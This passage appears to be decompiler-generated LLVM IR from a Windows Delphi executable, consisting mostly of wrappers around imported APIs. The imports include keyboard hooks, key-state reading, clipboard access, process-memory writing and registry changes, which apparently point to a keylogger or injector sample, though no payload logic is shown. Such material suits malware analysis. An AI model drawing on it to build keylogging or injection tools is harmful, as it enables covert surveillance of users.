  %5 = add i32 %4, 1, !insn.addr !83
  %6 = icmp slt i32 %5, 1, !insn.addr !84
  br i1 %6, label %dec_label_pc_4036c6, label %dec_label_pc_4036c2, !insn.addr !84

dec_label_pc_4036c2:                              ; preds = %dec_label_pc_4036bc
  store i32 %5, i32* %3, align 4, !insn.addr !85
  br label %dec_label_pc_4036c6, !insn.addr !85

dec_label_pc_4036c6:                              ; preds = %dec_label_pc_4036c2, %dec_label_pc_4036bc, %dec_label_pc_4036b8
  ret i32 %0, !insn.addr !86
}

define i32 @function_4036c8() local_unnamed_addr {
dec_label_pc_4036c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !87
  %spec.select = select i1 %1, i32 4208333, i32 %0
  ret i32 %spec.select, !insn.addr !88
}

declare i32 @InternalUniqueString() local_unnamed_addr

define i32 @UniqueString() local_unnamed_addr {
dec_label_pc_403718:
  %0 = call i32 @InternalUniqueString(), !insn.addr !89
  ret i32 %0, !insn.addr !89
}

define i32 @function_40371d() local_unnamed_addr {
dec_label_pc_40371d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !90
}

define i32 @function_403720() local_unnamed_addr {
dec_label_pc_403720:
  %0 = call i32 @InternalUniqueString(), !insn.addr !91
  ret i32 %0, !insn.addr !91
}

define i32 @function_403725() local_unnamed_addr {
dec_label_pc_403725:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !92
}

declare i32 @"@LStrCopy"() local_unnamed_addr

define i32 @function_403767() local_unnamed_addr {
dec_label_pc_403767:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !93
}

declare i32 @"@LStrDelete"() local_unnamed_addr

declare i32 @"@LStrInsert"() local_unnamed_addr

declare i32 @"@LStrPos"() local_unnamed_addr

declare i32 @"@LStrSetLength"() local_unnamed_addr

define i32 @function_4038bf() local_unnamed_addr {
dec_label_pc_4038bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !94
}

define i32 @function_40396b() local_unnamed_addr {
dec_label_pc_40396b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !95
}

declare i32 @"@FinalizeArray"() local_unnamed_addr

define i32 @function_403a6f() local_unnamed_addr {
dec_label_pc_403a6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !96
}

define i32 @function_403c7e() local_unnamed_addr {
dec_label_pc_403c7e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !97
}

define i32 @function_403c87() local_unnamed_addr {
dec_label_pc_403c87:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !98
}

define i32 @function_403c88() local_unnamed_addr {
dec_label_pc_403c88:
  %eax.0.reg2mem = alloca i32, !insn.addr !99
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !99
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !100
  br i1 %1, label %dec_label_pc_403c8f, label %dec_label_pc_403c8c, !insn.addr !100

dec_label_pc_403c8c:                              ; preds = %dec_label_pc_403c88
  %2 = add i32 %0, -4, !insn.addr !101
  %3 = inttoptr i32 %2 to i32*, !insn.addr !101
  %4 = load i32, i32* %3, align 4, !insn.addr !101
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !101
  br label %dec_label_pc_403c8f, !insn.addr !101

dec_label_pc_403c8f:                              ; preds = %dec_label_pc_403c8c, %dec_label_pc_403c88
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !102
}

define i32 @function_403c90() local_unnamed_addr {
dec_label_pc_403c90:
  %0 = call i32 @function_403c88(), !insn.addr !103
  %1 = add i32 %0, -1, !insn.addr !104
  ret i32 %1, !insn.addr !105
}

define i32 @FinalizeArray() local_unnamed_addr {
dec_label_pc_403ca8:
  %0 = call i32 @"@FinalizeArray"(), !insn.addr !106
  ret i32 %0, !insn.addr !106
}

define i32 @function_403cad() local_unnamed_addr {
dec_label_pc_403cad:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !107
}

define i32 @DynArrayClear() local_unnamed_addr {
dec_label_pc_403cb0:
  %0 = call i32 @"@DynArrayClear"(), !insn.addr !108
  ret i32 %0, !insn.addr !109
}

declare i32 @"@DynArraySetLength"() local_unnamed_addr

declare i32 @"@DynArrayClear"() local_unnamed_addr

declare i32 @RegisterModule() local_unnamed_addr

define i32 @UnregisterModule.47() local_unnamed_addr {
dec_label_pc_403f84:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !110
  ret i32 %0, !insn.addr !110
}

define i32 @function_403f89() local_unnamed_addr {
dec_label_pc_403f89:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !111
}

define i32 @function_403f8b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_403f8b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !112
}

define i32 @LCIDToCodePage.48() local_unnamed_addr {
dec_label_pc_40403a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !113
  ret i32 %0, !insn.addr !113
}

define i32 @function_40403f() local_unnamed_addr {
dec_label_pc_40403f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !114
}

define i32 @function_404041(i32 %arg1) local_unnamed_addr {
dec_label_pc_404041:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !115
}

define i32 @Finalization.49() local_unnamed_addr {
dec_label_pc_404092:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !116
  ret i32 %0, !insn.addr !116
}

define i32 @function_404097() local_unnamed_addr {
dec_label_pc_404097:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !117
}

define i32 @function_404099(i32 %arg1) local_unnamed_addr {
dec_label_pc_404099:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !118
}

define i32 @LocalAlloc.24() local_unnamed_addr {
dec_label_pc_404170:
  %0 = call i32 @LocalAlloc.3(), !insn.addr !119
  ret i32 %0, !insn.addr !119
}

define i32 @LocalFree.38() local_unnamed_addr {
dec_label_pc_404178:
  %0 = call i32 @LocalFree.2(), !insn.addr !120
  ret i32 %0, !insn.addr !120
}

define i32 @TlsAlloc.37() local_unnamed_addr {
dec_label_pc_404180:
  %0 = call i32 @TlsAlloc(), !insn.addr !121
  ret i32 %0, !insn.addr !121
}

define i1 @TlsFree.39(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_404188:
  %0 = call i1 @TlsFree(i32 %dwTlsIndex), !insn.addr !122
  ret i1 %0, !insn.addr !122
}

define i32* @TlsGetValue.22(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_404190:
  %0 = call i32* @TlsGetValue(i32 %dwTlsIndex), !insn.addr !123
  ret i32* %0, !insn.addr !123
}

define i1 @TlsSetValue.23(i32 %dwTlsIndex, i32* %lpTlsValue) local_unnamed_addr {
dec_label_pc_404198:
  %0 = call i1 @TlsSetValue(i32 %dwTlsIndex, i32* %lpTlsValue), !insn.addr !124
  ret i1 %0, !insn.addr !124
}

define i32 @GetTlsSize() local_unnamed_addr {
dec_label_pc_4041ac:
  ret i32 8, !insn.addr !125
}

define i32 @InitializeModule() local_unnamed_addr {
dec_label_pc_4042b0:
  %0 = call i32 @RegisterModule(), !insn.addr !126
  ret i32 %0, !insn.addr !127
}

declare i32 @"@InitLib"(i32) local_unnamed_addr

define i32 @function_404304() local_unnamed_addr {
dec_label_pc_404304:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !128
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !128
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !128
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !129
  %2 = load i32, i32* @global_var_409658, align 4, !insn.addr !130
  %3 = add i32 %2, 1, !insn.addr !130
  store i32 %3, i32* @global_var_409658, align 4, !insn.addr !130
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !131
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !132
  ret i32 0, !insn.addr !133
}

define i32 @function_404329() local_unnamed_addr {
dec_label_pc_404329:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !134
  ret i32 %0, !insn.addr !134
}

define i32 @function_40432e() local_unnamed_addr {
dec_label_pc_40432e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !135
}

define i32 @function_404330(i32 %arg1) local_unnamed_addr {
dec_label_pc_404330:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !136
}

define i32 @function_404334() local_unnamed_addr {
dec_label_pc_404334:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409658, align 4, !insn.addr !137
  %2 = add i32 %1, -1, !insn.addr !137
  store i32 %2, i32* @global_var_409658, align 4, !insn.addr !137
  ret i32 %0, !insn.addr !138
}

define i32 @function_40433c() local_unnamed_addr {
dec_label_pc_40433c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !139
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !139
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !139
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !140
  %2 = load i32, i32* @global_var_409660, align 4, !insn.addr !141
  %3 = add i32 %2, 1, !insn.addr !141
  store i32 %3, i32* @global_var_409660, align 4, !insn.addr !141
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !142
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !143
  ret i32 0, !insn.addr !144
}

define i32 @function_404361() local_unnamed_addr {
dec_label_pc_404361:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !145
  ret i32 %0, !insn.addr !145
}

define i32 @function_404366() local_unnamed_addr {
dec_label_pc_404366:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !146
}

define i32 @function_404368(i32 %arg1) local_unnamed_addr {
dec_label_pc_404368:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !147
}

define i32 @function_40436c() local_unnamed_addr {
dec_label_pc_40436c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409660, align 4, !insn.addr !148
  %2 = add i32 %1, -1, !insn.addr !148
  store i32 %2, i32* @global_var_409660, align 4, !insn.addr !148
  ret i32 %0, !insn.addr !149
}

define i32 @function_404374() local_unnamed_addr {
dec_label_pc_404374:
  %0 = call i32 @RegCloseKey.6(), !insn.addr !150
  ret i32 %0, !insn.addr !150
}

define i32 @function_40437c(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition) local_unnamed_addr {
dec_label_pc_40437c:
  %0 = call i32 @RegCreateKeyExA(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition), !insn.addr !151
  ret i32 %0, !insn.addr !151
}

define i32 @function_404384(i32* %hKey, i8* %lpSubKey) local_unnamed_addr {
dec_label_pc_404384:
  %0 = call i32 @RegDeleteKeyA(i32* %hKey, i8* %lpSubKey), !insn.addr !152
  ret i32 %0, !insn.addr !152
}

define i32 @function_40438c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_40438c:
  %0 = call i32 @RegOpenKeyExA.5(), !insn.addr !153
  ret i32 %0, !insn.addr !153
}

define i32 @function_404394(i32 %arg1, i32* %arg2, i32* %arg3, i32* %arg4, i32 %arg5, i8* %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404394:
  %0 = call i32 @RegQueryValueExA.4(), !insn.addr !154
  ret i32 %0, !insn.addr !154
}

define i32 @function_40439c(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData) local_unnamed_addr {
dec_label_pc_40439c:
  %0 = call i32 @RegSetValueExA(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData), !insn.addr !155
  ret i32 %0, !insn.addr !155
}

define i1 @function_4043a4(i32* %hObject) local_unnamed_addr {
dec_label_pc_4043a4:
  %0 = call i1 @CloseHandle(i32* %hObject), !insn.addr !156
  ret i1 %0, !insn.addr !156
}

define i32 @function_4043ac(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2) local_unnamed_addr {
dec_label_pc_4043ac:
  %0 = call i32 @CompareStringA(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2), !insn.addr !157
  ret i32 %0, !insn.addr !157
}

define i1 @function_4043b4(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists) local_unnamed_addr {
dec_label_pc_4043b4:
  %0 = call i1 @CopyFileA(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists), !insn.addr !158
  ret i1 %0, !insn.addr !158
}

define i32* @function_4043bc(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile) local_unnamed_addr {
dec_label_pc_4043bc:
  %0 = call i32* @CreateFileA(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile), !insn.addr !159
  ret i32* %0, !insn.addr !159
}

define i32* @function_4043c4(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId) local_unnamed_addr {
dec_label_pc_4043c4:
  %0 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId), !insn.addr !160
  ret i32* %0, !insn.addr !160
}

define i1 @function_4043cc(i8* %lpFileName) local_unnamed_addr {
dec_label_pc_4043cc:
  %0 = call i1 @DeleteFileA(i8* %lpFileName), !insn.addr !161
  ret i1 %0, !insn.addr !161
}

define i32 @function_4043d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4043d4:
  %0 = call i32 @ExitProcess.9(), !insn.addr !162
  ret i32 %0, !insn.addr !162
}

define i32* @function_4043dc(i32* %hModule, i8* %lpName, i8* %lpType) local_unnamed_addr {
dec_label_pc_4043dc:
  %0 = call i32* @FindResourceA(i32* %hModule, i8* %lpName, i8* %lpType), !insn.addr !163
  ret i32* %0, !insn.addr !163
}

define void @function_4043e4(i32* %hLibModule, i32 %dwExitCode) local_unnamed_addr {
dec_label_pc_4043e4:
  call void @FreeLibraryAndExitThread(i32* %hLibModule, i32 %dwExitCode), !insn.addr !164
  ret void, !insn.addr !164
}

define i32* @function_4043ec() local_unnamed_addr {
dec_label_pc_4043ec:
  %0 = call i32* @GetCurrentProcess(), !insn.addr !165
  ret i32* %0, !insn.addr !165
}

define i32 @function_4043f4(i32* %hFile, i32* %lpFileSizeHigh) local_unnamed_addr {
dec_label_pc_4043f4:
  %0 = call i32 @GetFileSize(i32* %hFile, i32* %lpFileSizeHigh), !insn.addr !166
  ret i32 %0, !insn.addr !166
}

define i32 @function_4043fc(i32* %hModule, i8* %lpFilename, i32 %nSize) local_unnamed_addr {
dec_label_pc_4043fc:
  %0 = call i32 @GetModuleFileNameA(i32* %hModule, i8* %lpFilename, i32 %nSize), !insn.addr !167
  ret i32 %0, !insn.addr !167
}

define i32* @function_404404(i8* %lpModuleName) local_unnamed_addr {
dec_label_pc_404404:
  %0 = call i32* @GetModuleHandleA(i8* %lpModuleName), !insn.addr !168
  ret i32* %0, !insn.addr !168
}

define i32 ()* @function_40440c(i32* %hModule, i8* %lpProcName) local_unnamed_addr {
dec_label_pc_40440c:
  %0 = call i32 ()* @GetProcAddress(i32* %hModule, i8* %lpProcName), !insn.addr !169
  ret i32 ()* %0, !insn.addr !169
}

define i32 @function_404414(i32 %nBufferLength, i8* %lpBuffer) local_unnamed_addr {
dec_label_pc_404414:
  %0 = call i32 @GetTempPathA(i32 %nBufferLength, i8* %lpBuffer), !insn.addr !170
  ret i32 %0, !insn.addr !170
}

define i32 @function_40441c() local_unnamed_addr {
dec_label_pc_40441c:
  %0 = call i32 @GetTickCount.8(), !insn.addr !171
  ret i32 %0, !insn.addr !171
}

define i32* @function_404424(i32 %uFlags, i32 %dwBytes) local_unnamed_addr {
dec_label_pc_404424:
  %0 = call i32* @GlobalAlloc(i32 %uFlags, i32 %dwBytes), !insn.addr !172
  ret i32* %0, !insn.addr !172
}

define i32* @function_40442c(i32* %hMem) local_unnamed_addr {
dec_label_pc_40442c:
  %0 = call i32* @GlobalFree(i32* %hMem), !insn.addr !173
  ret i32* %0, !insn.addr !173
}

define i32* @function_404434(i32* %hMem) local_unnamed_addr {
dec_label_pc_404434:
  %0 = call i32* @GlobalLock(i32* %hMem), !insn.addr !174
  ret i32* %0, !insn.addr !174
}

define i1 @function_40443c(i32* %hMem) local_unnamed_addr {
dec_label_pc_40443c:
  %0 = call i1 @GlobalUnlock(i32* %hMem), !insn.addr !175
  ret i1 %0, !insn.addr !175
}

define i32* @function_404444(i8* %lpLibFileName) local_unnamed_addr {
dec_label_pc_404444:
  %0 = call i32* @LoadLibraryA(i8* %lpLibFileName), !insn.addr !176
  ret i32* %0, !insn.addr !176
}

define i1 @function_40444c(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_40444c:
  %0 = call i1 @ReadFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped), !insn.addr !177
  ret i1 %0, !insn.addr !177
}

define i1 @function_404454(i32* %hFile) local_unnamed_addr {
dec_label_pc_404454:
  %0 = call i1 @SetEndOfFile(i32* %hFile), !insn.addr !178
  ret i1 %0, !insn.addr !178
}

define void @function_40445c(i32 %dwMilliseconds) local_unnamed_addr {
dec_label_pc_40445c:
  call void @Sleep(i32 %dwMilliseconds), !insn.addr !179
  ret void, !insn.addr !179
}

define i1 @function_404464(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect) local_unnamed_addr {
dec_label_pc_404464:
  %0 = call i1 @VirtualProtect(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect), !insn.addr !180
  ret i1 %0, !insn.addr !180
}

define i32 @function_40446c() local_unnamed_addr {
dec_label_pc_40446c:
  %0 = call i32 @WriteFile.7(), !insn.addr !181
  ret i32 %0, !insn.addr !181
}

define i1 @function_404474(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten) local_unnamed_addr {
dec_label_pc_404474:
  %0 = call i1 @WriteProcessMemory(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten), !insn.addr !182
  ret i1 %0, !insn.addr !182
}

define i32 @function_40447c(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_40447c:
  %0 = call i32 @lstrcmpiA(i8* %lpString1, i8* %lpString2), !insn.addr !183
  ret i32 %0, !insn.addr !183
}

define i8* @function_404484(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_404484:
  %0 = call i8* @lstrcpyA(i8* %lpString1, i8* %lpString2), !insn.addr !184
  ret i8* %0, !insn.addr !184
}

define i1 @function_40448c(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer) local_unnamed_addr {
dec_label_pc_40448c:
  %0 = call i1 @GetCharWidthA(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer), !insn.addr !185
  ret i1 %0, !insn.addr !185
}

define i32* @function_404494(i32 %i) local_unnamed_addr {
dec_label_pc_404494:
  %0 = call i32* @GetStockObject(i32 %i), !insn.addr !186
  ret i32* %0, !insn.addr !186
}

define i32* @function_40449c(i32* %hdc, i32* %h) local_unnamed_addr {
dec_label_pc_40449c:
  %0 = call i32* @SelectObject(i32* %hdc, i32* %h), !insn.addr !187
  ret i32* %0, !insn.addr !187
}

define i32 @function_4044a4(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044a4:
  %0 = call i32 @CallNextHookEx(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam), !insn.addr !188
  ret i32 %0, !insn.addr !188
}

define i1 @function_4044ac() local_unnamed_addr {
dec_label_pc_4044ac:
  %0 = call i1 @CloseClipboard(), !insn.addr !189
  ret i1 %0, !insn.addr !189
}

define i32 @function_4044b4(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044b4:
  %0 = call i32 @DefWindowProcA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !190
  ret i32 %0, !insn.addr !190
}

define i32 @function_4044bc(%tagMSG* %lpMsg) local_unnamed_addr {
dec_label_pc_4044bc:
  %0 = call i32 @DispatchMessageA(%tagMSG* %lpMsg), !insn.addr !191
  ret i32 %0, !insn.addr !191
}

define i1 @function_4044c4(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044c4:
  %0 = call i1 @EnumWindows(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam), !insn.addr !192
  ret i1 %0, !insn.addr !192
}

define i32* @function_4044cc(i8* %lpClassName, i8* %lpWindowName) local_unnamed_addr {
dec_label_pc_4044cc:
  %0 = call i32* @FindWindowA(i8* %lpClassName, i8* %lpWindowName), !insn.addr !193
  ret i32* %0, !insn.addr !193
}

define i32* @function_4044d4(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow) local_unnamed_addr {
dec_label_pc_4044d4:
  %0 = call i32* @FindWindowExA(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow), !insn.addr !194
  ret i32* %0, !insn.addr !194
}

define i1 @function_4044dc(%tagPOINT* %lpPoint) local_unnamed_addr {
dec_label_pc_4044dc:
  %0 = call i1 @GetCaretPos(%tagPOINT* %lpPoint), !insn.addr !195
  ret i1 %0, !insn.addr !195
}

define i32 @function_4044e4(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_4044e4:
  %0 = call i32 @GetClassLongA(i32* %hWnd, i32 %nIndex), !insn.addr !196
  ret i32 %0, !insn.addr !196
}

define i32 @function_4044ec(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount) local_unnamed_addr {
dec_label_pc_4044ec:
  %0 = call i32 @GetClassNameA(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount), !insn.addr !197
  ret i32 %0, !insn.addr !197
}

define i32* @function_4044f4(i32 %uFormat) local_unnamed_addr {
dec_label_pc_4044f4:
  %0 = call i32* @GetClipboardData(i32 %uFormat), !insn.addr !198
  ret i32* %0, !insn.addr !198
}

define i32* @function_4044fc(i32* %hWnd) local_unnamed_addr {
dec_label_pc_4044fc:
  %0 = call i32* @GetDC(i32* %hWnd), !insn.addr !199
  ret i32* %0, !insn.addr !199
}

define i1 @function_404504(i8* %lpKeyState) local_unnamed_addr {
dec_label_pc_404504:
  %0 = call i1 @GetKeyboardState(i8* %lpKeyState), !insn.addr !200
  ret i1 %0, !insn.addr !200
}

define i1 @function_40450c(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax) local_unnamed_addr {
dec_label_pc_40450c:
  %0 = call i1 @GetMessageA(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax), !insn.addr !201
  ret i1 %0, !insn.addr !201
}

define i32* @function_404514(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404514:
  %0 = call i32* @GetParent(i32* %hWnd), !insn.addr !202
  ret i32* %0, !insn.addr !202
}

define i32* @function_40451c(i32* %hWnd) local_unnamed_addr {
dec_label_pc_40451c:
  %0 = call i32* @GetTopWindow(i32* %hWnd), !insn.addr !203
  ret i32* %0, !insn.addr !203
}

define i32* @function_404524(i32* %hWnd, i32 %uCmd) local_unnamed_addr {
dec_label_pc_404524:
  %0 = call i32* @GetWindow(i32* %hWnd, i32 %uCmd), !insn.addr !204
  ret i32* %0, !insn.addr !204
}

define i32 @function_40452c(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_40452c:
  %0 = call i32 @GetWindowLongA(i32* %hWnd, i32 %nIndex), !insn.addr !205
  ret i32 %0, !insn.addr !205
}

define i32 @function_404534(i32* %hWnd, i32* %lpdwProcessId) local_unnamed_addr {
dec_label_pc_404534:
  %0 = call i32 @GetWindowThreadProcessId(i32* %hWnd, i32* %lpdwProcessId), !insn.addr !206
  ret i32 %0, !insn.addr !206
}

define i1 @function_40453c(i32* %hWnd) local_unnamed_addr {
dec_label_pc_40453c:
  %0 = call i1 @IsWindow(i32* %hWnd), !insn.addr !207
  ret i1 %0, !insn.addr !207
}

define i1 @function_404544(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404544:
  %0 = call i1 @IsWindowVisible(i32* %hWnd), !insn.addr !208
  ret i1 %0, !insn.addr !208
}

define i1 @TObject.AfterConstruction(i32* %hWnd, i32 %uIDEvent) local_unnamed_addr {
dec_label_pc_40454c:
  %0 = call i1 @KillTimer(i32* %hWnd, i32 %uIDEvent), !insn.addr !209
  ret i1 %0, !insn.addr !209
}

define i32* @function_404554(i32* %hInstance, i8* %lpIconName) local_unnamed_addr {
dec_label_pc_404554:
  %0 = call i32* @LoadIconA(i32* %hInstance, i8* %lpIconName), !insn.addr !210
  ret i32* %0, !insn.addr !210
}

define i1 @function_40455c(i32* %hWndNewOwner) local_unnamed_addr {
dec_label_pc_40455c:
  %0 = call i1 @OpenClipboard(i32* %hWndNewOwner), !insn.addr !211
  ret i1 %0, !insn.addr !211
}

define i1 @function_404564(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_404564:
  %0 = call i1 @PostMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !212
  ret i1 %0, !insn.addr !212
}

define void @function_40456c(i32 %nExitCode) local_unnamed_addr {
dec_label_pc_40456c:
  call void @PostQuitMessage(i32 %nExitCode), !insn.addr !213
  ret void, !insn.addr !213
}

define i32 @function_404574(i32* %hWnd, i32* %hDC) local_unnamed_addr {
dec_label_pc_404574:
  %0 = call i32 @ReleaseDC(i32* %hWnd, i32* %hDC), !insn.addr !214
  ret i32 %0, !insn.addr !214
}

define i32 @function_40457c(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_40457c:
  %0 = call i32 @SendMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !215
  ret i32 %0, !insn.addr !215
}

define i32 @function_404584(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc) local_unnamed_addr {
dec_label_pc_404584:
  %0 = call i32 @SetTimer(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc), !insn.addr !216
  ret i32 %0, !insn.addr !216
}

define i32 @function_40458c(i32* %hWnd, i32 %nIndex, i32 %dwNewLong) local_unnamed_addr {
dec_label_pc_40458c:
  %0 = call i32 @SetWindowLongA(i32* %hWnd, i32 %nIndex, i32 %dwNewLong), !insn.addr !217
  ret i32 %0, !insn.addr !217
}

define i32* @function_404594(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId) local_unnamed_addr {
dec_label_pc_404594:
  %0 = call i32* @SetWindowsHookExA(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId), !insn.addr !218
  ret i32* %0, !insn.addr !218
}

define i32 @function_40459c(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags) local_unnamed_addr {
dec_label_pc_40459c:
  %0 = call i32 @ToAscii(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags), !insn.addr !219
  ret i32 %0, !insn.addr !219
}

define i1 @function_4045a4(i32* %hhk) local_unnamed_addr {
dec_label_pc_4045a4:
  %0 = call i1 @UnhookWindowsHookEx(i32* %hhk), !insn.addr !220
  ret i1 %0, !insn.addr !220
}

define i32 @function_4045ac() local_unnamed_addr {
dec_label_pc_4045ac:
  %0 = call i32 @Move(), !insn.addr !221
  ret i32 %0, !insn.addr !222
}

define i32 @_CreateWindowExA() local_unnamed_addr {
dec_label_pc_4045b4:
  %0 = call i32 @CreateWindowExA.10(), !insn.addr !223
  ret i32 %0, !insn.addr !223
}

